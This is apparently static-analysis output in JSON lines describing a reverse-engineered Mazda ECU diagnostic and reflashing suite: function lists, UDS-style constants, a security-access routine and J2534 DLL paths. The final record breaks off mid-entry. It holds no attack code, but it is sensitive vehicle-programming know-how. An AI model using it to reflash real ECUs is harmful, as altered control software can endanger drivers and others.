{"file_path": "mds5.py", "lines_read": 515, "features_found": [{"type": "function", "name": "__init__", "line": 59}, {"type": "function", "name": "enter_programming_mode", "line": 65}, {"type": "function", "name": "_perform_programming_security_access", "line": 105}, {"type": "function", "name": "download_calibration", "line": 111}, {"type": "function", "name": "_request_download", "line": 153}, {"type": "function", "name": "_transfer_data_blocks", "line": 181}, {"type": "function", "name": "_transfer_data_block", "line": 214}, {"type": "function", "name": "_exit_download", "line": 241}, {"type": "function", "name": "upload_calibration", "line": 251}, {"type": "function", "name": "_request_upload", "line": 288}, {"type": "function", "name": "_upload_data_blocks", "line": 314}, {"type": "function", "name": "_upload_data_block", "line": 347}, {"type": "function", "name": "_exit_upload", "line": 360}, {"type": "function", "name": "verify_calibration", "line": 370}, {"type": "function", "name": "_find_data_differences", "line": 405}, {"type": "function", "name": "calculate_checksum", "line": 420}, {"type": "function", "name": "_calculate_checksum", "line": 424}, {"type": "function", "name": "read_ecu_identification", "line": 431}, {"type": "function", "name": "exit_programming_mode", "line": 467}, {"type": "function", "name": "get_programming_state", "line": 494}, {"type": "function", "name": "reset_ecu", "line": 498}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "ProgrammingSession", "line": 21}, {"type": "class", "name": "ProgrammingState", "line": 33}, {"type": "class", "name": "ProgrammingBlock", "line": 45}, {"type": "class", "name": "MazdaProgrammingService", "line": 53}], "algorithms": [{"type": "algorithm_function", "line": 420, "content": "def calculate_checksum(self, data: bytes) -> int:"}, {"type": "algorithm_function", "line": 424, "content": "def _calculate_checksum(self, data: bytes) -> int:"}], "protocols": [{"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER_ENTER = 0x01"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER_EXIT = 0x02"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "DOWNLOAD_REQUEST = 0x03"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "DOWNLOAD_TRANSFER = 0x04"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "DOWNLOAD_EXIT = 0x05"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "UPLOAD_REQUEST = 0x06"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "UPLOAD_TRANSFER = 0x07"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "UPLOAD_EXIT = 0x08"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "ROUTINE_CONTROL = 0x09"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "IDLE = 0x00"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER_ACTIVE = 0x01"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "DOWNLOAD_ACTIVE = 0x02"}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "UPLOAD_ACTIVE = 0x03"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "VERIFICATION_ACTIVE = 0x04"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "PROGRAMMING_ACTIVE = 0x05"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "COMPLETED = 0x06"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "ERROR = 0x07"}, {"type": "protocol", "line": 87, "protocol": "0x[0-9A-Fa-f]+", "content": "routine_id=0xFF00,  # Enter programming routine"}, {"type": "protocol", "line": 88, "protocol": "0x[0-9A-Fa-f]+", "content": "control_type=0x01,   # Start routine"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address: int = 0xFFA000) -> bool:"}, {"type": "protocol", "line": 164, "protocol": "0x[0-9A-Fa-f]+", "content": "data_format=0x00,  # No compression/encryption"}, {"type": "protocol", "line": 165, "protocol": "0x[0-9A-Fa-f]+", "content": "address_length=0x03,  # 3-byte addressing"}, {"type": "protocol", "line": 166, "protocol": "0x[0-9A-Fa-f]+", "content": "memory_size_length=0x03  # 3-byte length"}, {"type": "protocol", "line": 298, "protocol": "0x[0-9A-Fa-f]+", "content": "data_format=0x00,  # No compression/encryption"}, {"type": "protocol", "line": 299, "protocol": "0x[0-9A-Fa-f]+", "content": "address_length=0x03,  # 3-byte addressing"}, {"type": "protocol", "line": 300, "protocol": "0x[0-9A-Fa-f]+", "content": "memory_size_length=0x03  # 3-byte length"}, {"type": "protocol", "line": 422, "protocol": "0x[0-9A-Fa-f]+", "content": "return sum(data) & 0xFFFF"}, {"type": "protocol", "line": 428, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte) & 0xFFFF"}, {"type": "protocol", "line": 442, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_data = self.diagnostic_protocol.read_data_by_identifier(0xF101)"}, {"type": "protocol", "line": 447, "protocol": "0x[0-9A-Fa-f]+", "content": "part_data = self.diagnostic_protocol.read_data_by_identifier(0xF104)"}, {"type": "protocol", "line": 452, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_data = self.diagnostic_protocol.read_data_by_identifier(0xF102)"}, {"type": "protocol", "line": 457, "protocol": "0x[0-9A-Fa-f]+", "content": "sw_data = self.diagnostic_protocol.read_data_by_identifier(0xF106)"}, {"type": "protocol", "line": 476, "protocol": "0x[0-9A-Fa-f]+", "content": "routine_id=0xFF00,  # Exit programming routine"}, {"type": "protocol", "line": 477, "protocol": "0x[0-9A-Fa-f]+", "content": "control_type=0x02,   # Stop routine"}, {"type": "protocol", "line": 505, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.diagnostic_protocol.ecu_reset(reset_type=0x01)  # Hard reset"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "MAZDA PROGRAMMING SERVICES - Complete ECU Programming Implementation"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "\"\"\"ECU Programming Session Types\"\"\""}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "\"\"\"ECU Programming States\"\"\""}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "\"\"\"ECU Programming Data Block\"\"\""}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "Complete Mazda ECU Programming Service"}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "Handles all ECU programming and calibration flashing operations"}, {"type": "hardware", "line": 63, "hardware": "ECU", "content": "self.security_access = None"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "Enter ECU programming mode"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "This switches the ECU to bootloader for programming"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "logger.info(\"Entering ECU programming mode...\")"}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "if not self._perform_programming_security_access():"}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "logger.error(\"Failed security access for programming\")"}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "def _perform_programming_security_access(self) -> bool:"}, {"type": "hardware", "line": 106, "hardware": "ECU", "content": "\"\"\"Perform security access for programming operations\"\"\""}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "Download calibration data to ECU"}, {"type": "hardware", "line": 154, "hardware": "ECU", "content": "\"\"\"Request download session with ECU\"\"\""}, {"type": "hardware", "line": 172, "hardware": "ECU", "content": "logger.debug(f\"ECU accepted download, max block: {self.max_block_length} bytes\")"}, {"type": "hardware", "line": 182, "hardware": "ECU", "content": "\"\"\"Transfer data in blocks to ECU\"\"\""}, {"type": "hardware", "line": 216, "hardware": "ECU", "content": "\"\"\"Transfer single data block to ECU\"\"\""}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "Upload calibration data from ECU"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "\"\"\"Request upload session with ECU\"\"\""}, {"type": "hardware", "line": 305, "hardware": "ECU", "content": "logger.debug(f\"ECU accepted upload, max block: {self.max_block_length} bytes\")"}, {"type": "hardware", "line": 315, "hardware": "ECU", "content": "\"\"\"Upload data in blocks from ECU\"\"\""}, {"type": "hardware", "line": 348, "hardware": "ECU", "content": "\"\"\"Upload single data block from ECU\"\"\""}, {"type": "hardware", "line": 431, "hardware": "ECU", "content": "def read_ecu_identification(self) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 433, "hardware": "ECU", "content": "Read ECU identification information"}, {"type": "hardware", "line": 436, "hardware": "ECU", "content": "ECU identification data or None if failed"}, {"type": "hardware", "line": 439, "hardware": "ECU", "content": "ecu_info = {}"}, {"type": "hardware", "line": 444, "hardware": "ECU", "content": "ecu_info['vin'] = vin_data.decode('ascii', errors='ignore')"}, {"type": "hardware", "line": 449, "hardware": "ECU", "content": "ecu_info['part_number'] = part_data.hex().upper()"}, {"type": "hardware", "line": 454, "hardware": "ECU", "content": "ecu_info['calibration_id'] = cal_data.decode('ascii', errors='ignore')"}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "ecu_info['software_version'] = sw_data.hex().upper()"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "return ecu_info if ecu_info else None"}, {"type": "hardware", "line": 464, "hardware": "ECU", "content": "logger.error(f\"Error reading ECU identification: {e}\")"}, {"type": "hardware", "line": 498, "hardware": "ECU", "content": "def reset_ecu(self) -> bool:"}, {"type": "hardware", "line": 500, "hardware": "ECU", "content": "Perform ECU reset after programming"}, {"type": "hardware", "line": 503, "hardware": "ECU", "content": "logger.info(\"Performing ECU reset...\")"}, {"type": "hardware", "line": 505, "hardware": "ECU", "content": "response = self.diagnostic_protocol.ecu_reset(reset_type=0x01)  # Hard reset"}, {"type": "hardware", "line": 507, "hardware": "ECU", "content": "logger.info(\"ECU reset command sent\")"}, {"type": "hardware", "line": 510, "hardware": "ECU", "content": "logger.error(\"ECU reset failed\")"}, {"type": "hardware", "line": 514, "hardware": "ECU", "content": "logger.error(f\"Error during ECU reset: {e}\")"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 63, "pattern": "security_access", "content": "self.security_access = None"}, {"type": "security_pattern", "line": 81, "pattern": "security_access", "content": "if not self._perform_programming_security_access():"}, {"type": "security_pattern", "line": 105, "pattern": "security_access", "content": "def _perform_programming_security_access(self) -> bool:"}, {"type": "security_pattern", "line": 164, "pattern": "encrypt", "content": "data_format=0x00,  # No compression/encryption"}, {"type": "security_pattern", "line": 298, "pattern": "encrypt", "content": "data_format=0x00,  # No compression/encryption"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds6.py", "lines_read": 444, "features_found": [{"type": "function", "name": "__init__", "line": 91}, {"type": "function", "name": "_load_j2534_library", "line": 102}, {"type": "function", "name": "_setup_function_prototypes", "line": 140}, {"type": "function", "name": "connect", "line": 189}, {"type": "function", "name": "connect_channel", "line": 209}, {"type": "function", "name": "disconnect", "line": 234}, {"type": "function", "name": "send_message", "line": 253}, {"type": "function", "name": "receive_message", "line": 274}, {"type": "function", "name": "set_protocol_parameters", "line": 297}, {"type": "function", "name": "_build_config_list", "line": 324}, {"type": "function", "name": "create_message_filter", "line": 336}, {"type": "function", "name": "_create_passthru_msg", "line": 369}, {"type": "function", "name": "read_vehicle_voltage", "line": 393}, {"type": "function", "name": "clear_buffers", "line": 418}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "platform", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "wintypes,", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [{"type": "class", "name": "J2534Error", "line": 17}, {"type": "class", "name": "J2534Protocol", "line": 47}, {"type": "class", "name": "J2534Ioctl", "line": 61}, {"type": "class", "name": "J2534MessageFlag", "line": 78}, {"type": "class", "name": "J2534Interface", "line": 85}, {"type": "class", "name": "ConfigList", "line": 328}, {"type": "class", "name": "PassThruMsg", "line": 371}], "algorithms": [], "protocols": [{"type": "protocol", "line": 4, "protocol": "J2534", "content": "J2534 INTERFACE - Complete J2534 Pass-Thru Implementation"}, {"type": "protocol", "line": 5, "protocol": "J2534", "content": "Reverse engineered from Mazda IDS/M-MDS J2534 interface"}, {"type": "protocol", "line": 17, "protocol": "J2534", "content": "class J2534Error(IntEnum):"}, {"type": "protocol", "line": 18, "protocol": "J2534", "content": "\"\"\"J2534 Error Codes\"\"\""}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "STATUS_NOERROR = 0x00"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NOT_SUPPORTED = 0x01"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_CHANNEL_ID = 0x02"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_PROTOCOL_ID = 0x03"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NULL_PARAMETER = 0x04"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_IOCTL_VALUE = 0x05"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_FLAGS = 0x06"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_FAILED = 0x07"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_DEVICE_NOT_CONNECTED = 0x08"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_TIMEOUT = 0x09"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_MSG = 0x0A"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_TIME_INTERVAL = 0x0B"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_EXCEEDED_LIMIT = 0x0C"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_MSG_ID = 0x0D"}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_DEVICE_IN_USE = 0x0E"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_IOCTL_ID = 0x0F"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_EMPTY = 0x10"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_FULL = 0x11"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_OVERFLOW = 0x12"}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_PIN_INVALID = 0x13"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_CHANNEL_IN_USE = 0x14"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_MSG_PROTOCOL_ID = 0x15"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_FILTER_ID = 0x16"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NO_FLOW_CONTROL = 0x17"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NOT_UNIQUE = 0x18"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_BAUDRATE = 0x19"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_DEVICE_ID = 0x1A"}, {"type": "protocol", "line": 47, "protocol": "J2534", "content": "class J2534Protocol(IntEnum):"}, {"type": "protocol", "line": 48, "protocol": "J2534", "content": "\"\"\"J2534 Protocol IDs\"\"\""}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "J1850VPW = 0x01"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "J1850PWM = 0x02"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO9141 = 0x03"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO14230 = 0x04"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO15765 = 0x05"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_A_ENGINE = 0x06"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_A_TRANS = 0x07"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_B_ENGINE = 0x08"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_B_TRANS = 0x09"}, {"type": "protocol", "line": 58, "protocol": "CAN", "content": "CAN = 0x0A"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "CAN = 0x0A"}, {"type": "protocol", "line": 59, "protocol": "CAN", "content": "CAN_PS = 0x0B"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "CAN_PS = 0x0B"}, {"type": "protocol", "line": 61, "protocol": "J2534", "content": "class J2534Ioctl(IntEnum):"}, {"type": "protocol", "line": 62, "protocol": "J2534", "content": "\"\"\"J2534 IOCTL IDs\"\"\""}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "GET_CONFIG = 0x01"}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "SET_CONFIG = 0x02"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "READ_VBATT = 0x03"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "READ_PROG_VOLTAGE = 0x04"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "FIVE_BAUD_INIT = 0x05"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "FAST_INIT = 0x06"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_TX_BUFFER = 0x07"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_RX_BUFFER = 0x08"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_PERIODIC_MSGS = 0x09"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_MSG_FILTERS = 0x0A"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_FUNCT_MSG_LOOKUP_TABLE = 0x0B"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "ADD_TO_FUNCT_MSG_LOOKUP_TABLE = 0x0C"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "DELETE_FROM_FUNCT_MSG_LOOKUP_TABLE = 0x0D"}, {"type": "protocol", "line": 76, "protocol": "0x[0-9A-Fa-f]+", "content": "READ_PROG_VOLTAGE_2 = 0x0E"}, {"type": "protocol", "line": 78, "protocol": "J2534", "content": "class J2534MessageFlag(IntEnum):"}, {"type": "protocol", "line": 79, "protocol": "J2534", "content": "\"\"\"J2534 Message Flags\"\"\""}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_FLAG_NONE = 0x00"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_FLAG_SCI_TX_VOLTAGE = 0x0080"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_FLAG_SCI_MODE = 0x0100"}, {"type": "protocol", "line": 83, "protocol": "CAN", "content": "TX_FLAG_CAN_29BIT_ID = 0x0100"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_FLAG_CAN_29BIT_ID = 0x0100"}, {"type": "protocol", "line": 85, "protocol": "J2534", "content": "class J2534Interface:"}, {"type": "protocol", "line": 87, "protocol": "J2534", "content": "Complete J2534 Pass-Thru Interface Implementation"}, {"type": "protocol", "line": 99, "protocol": "J2534", "content": "logger.error(\"Failed to load J2534 library\")"}, {"type": "protocol", "line": 103, "protocol": "J2534", "content": "\"\"\"Load J2534 Pass-Thru DLL\"\"\""}, {"type": "protocol", "line": 111, "protocol": "J2534", "content": "\"C:\\\\Program Files\\\\Mazda\\\\IDS\\\\J2534PassThru.dll\","}, {"type": "protocol", "line": 112, "protocol": "J2534", "content": "\"C:\\\\Program Files (x86)\\\\Mazda\\\\IDS\\\\J2534PassThru.dll\","}, {"type": "protocol", "line": 113, "protocol": "J2534", "content": "\"C:\\\\Windows\\\\System32\\\\J2534PassThru.dll\","}, {"type": "protocol", "line": 114, "protocol": "J2534", "content": "\"C:\\\\Program Files\\\\Drew Technologies\\\\J2534 Pass-Thru\\\\J2534PassThru.dll\""}, {"type": "protocol", "line": 120, "protocol": "J2534", "content": "logger.info(f\"Loaded J2534 library from: {path}\")"}, {"type": "protocol", "line": 126, "protocol": "J2534", "content": "logger.error(\"No J2534 library found\")"}, {"type": "protocol", "line": 133, "protocol": "J2534", "content": "logger.error(\"J2534 interface only supported on Windows\")"}, {"type": "protocol", "line": 137, "protocol": "J2534", "content": "logger.error(f\"Error loading J2534 library: {e}\")"}, {"type": "protocol", "line": 141, "protocol": "J2534", "content": "\"\"\"Setup J2534 function prototypes\"\"\""}, {"type": "protocol", "line": 189, "protocol": "J2534", "content": "def connect(self, device_name: str = \"Mazda J2534\") -> bool:"}, {"type": "protocol", "line": 190, "protocol": "J2534", "content": "\"\"\"Connect to J2534 device\"\"\""}, {"type": "protocol", "line": 196, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 197, "protocol": "J2534", "content": "logger.error(f\"Failed to open J2534 device: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 201, "protocol": "J2534", "content": "logger.info(f\"Connected to J2534 device: {device_name}\")"}, {"type": "protocol", "line": 206, "protocol": "J2534", "content": "logger.error(f\"Error connecting to J2534 device: {e}\")"}, {"type": "protocol", "line": 209, "protocol": "J2534", "content": "def connect_channel(self, protocol: J2534Protocol, baudrate: int = 500000,"}, {"type": "protocol", "line": 214, "protocol": "J2534", "content": "logger.error(\"J2534 device not connected\")"}, {"type": "protocol", "line": 222, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 223, "protocol": "J2534", "content": "logger.error(f\"Failed to connect channel: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 246, "protocol": "J2534", "content": "logger.info(\"Disconnected from J2534 device\")"}, {"type": "protocol", "line": 263, "protocol": "J2534", "content": "logger.debug(f\"Sending J2534 message: {message_data.hex().upper()}\")"}, {"type": "protocol", "line": 309, "protocol": "J2534", "content": "self.channel_id, J2534Ioctl.SET_CONFIG,"}, {"type": "protocol", "line": 313, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 314, "protocol": "J2534", "content": "logger.error(f\"Failed to set protocol parameters: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 325, "protocol": "J2534", "content": "\"\"\"Build J2534 configuration list from parameters\"\"\""}, {"type": "protocol", "line": 358, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 359, "protocol": "J2534", "content": "logger.error(f\"Failed to create filter: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 370, "protocol": "J2534", "content": "\"\"\"Create J2534 PassThruMsg structure\"\"\""}, {"type": "protocol", "line": 383, "protocol": "CAN", "content": "msg.protocol_id = J2534Protocol.ISO15765  # Default to CAN"}, {"type": "protocol", "line": 383, "protocol": "J2534", "content": "msg.protocol_id = J2534Protocol.ISO15765  # Default to CAN"}, {"type": "protocol", "line": 402, "protocol": "J2534", "content": "self.channel_id, J2534Ioctl.READ_VBATT, None, ctypes.byref(voltage)"}, {"type": "protocol", "line": 405, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 406, "protocol": "J2534", "content": "logger.error(f\"Failed to read voltage: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 427, "protocol": "J2534", "content": "self.channel_id, J2534Ioctl.CLEAR_TX_BUFFER, None, None"}, {"type": "protocol", "line": 429, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 430, "protocol": "J2534", "content": "logger.warning(f\"Failed to clear TX buffer: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 434, "protocol": "J2534", "content": "self.channel_id, J2534Ioctl.CLEAR_RX_BUFFER, None, None"}, {"type": "protocol", "line": 436, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 437, "protocol": "J2534", "content": "logger.warning(f\"Failed to clear RX buffer: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 439, "protocol": "J2534", "content": "logger.debug(\"Cleared J2534 buffers\")"}], "hardware_assumptions": [{"type": "hardware", "line": 88, "hardware": "vehicle", "content": "Provides low-level vehicle communication for Mazda diagnostics"}, {"type": "hardware", "line": 211, "hardware": "vehicle", "content": "\"\"\"Connect to vehicle communication channel\"\"\""}, {"type": "hardware", "line": 235, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle and device\"\"\""}, {"type": "hardware", "line": 254, "hardware": "vehicle", "content": "\"\"\"Send message to vehicle\"\"\""}, {"type": "hardware", "line": 275, "hardware": "vehicle", "content": "\"\"\"Receive message from vehicle\"\"\""}, {"type": "hardware", "line": 393, "hardware": "vehicle", "content": "def read_vehicle_voltage(self) -> Optional[float]:"}, {"type": "hardware", "line": 394, "hardware": "vehicle", "content": "\"\"\"Read vehicle battery voltage\"\"\""}, {"type": "hardware", "line": 411, "hardware": "vehicle", "content": "logger.debug(f\"Vehicle voltage: {voltage_volts:.1f}V\")"}, {"type": "hardware", "line": 415, "hardware": "vehicle", "content": "logger.error(f\"Error reading vehicle voltage: {e}\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds7.py", "lines_read": 471, "features_found": [{"type": "function", "name": "main", "line": 369}, {"type": "function", "name": "__init__", "line": 27}, {"type": "function", "name": "setup_logging", "line": 43}, {"type": "function", "name": "connect_to_vehicle", "line": 56}, {"type": "function", "name": "read_vehicle_information", "line": 97}, {"type": "function", "name": "read_diagnostic_trouble_codes", "line": 133}, {"type": "function", "name": "clear_diagnostic_trouble_codes", "line": 161}, {"type": "function", "name": "read_live_data", "line": 183}, {"type": "function", "name": "_decode_pid_value", "line": 209}, {"type": "function", "name": "read_ecu_calibration", "line": 215}, {"type": "function", "name": "program_ecu_calibration", "line": 257}, {"type": "function", "name": "perform_ecu_reset", "line": 303}, {"type": "function", "name": "generate_diagnostic_report", "line": 325}, {"type": "function", "name": "disconnect", "line": 358}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "core.diagnostic_protocols", "line": null}, {"type": "import", "module": "core.security_access", "line": null}, {"type": "import", "module": "databases.dtc_database", "line": null}, {"type": "import", "module": "databases.calibration_database", "line": null}, {"type": "import", "module": "services.programming_services", "line": null}, {"type": "import", "module": "interfaces.j2534_interface", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "argparse", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "MazdaDiagnosticProtocol,", "line": null}, {"type": "import", "module": "MazdaSecurityAccess,", "line": null}, {"type": "import", "module": "MazdaDTCDatabase", "line": null}, {"type": "import", "module": "MazdaCalibrationDatabase", "line": null}, {"type": "import", "module": "MazdaProgrammingService", "line": null}, {"type": "import", "module": "J2534Interface", "line": null}], "components_found": [{"type": "class", "name": "MazdaIDSSoftware", "line": 21}], "algorithms": [], "protocols": [{"type": "protocol", "line": 19, "protocol": "J2534", "content": "from interfaces.j2534_interface import J2534Interface"}, {"type": "protocol", "line": 36, "protocol": "J2534", "content": 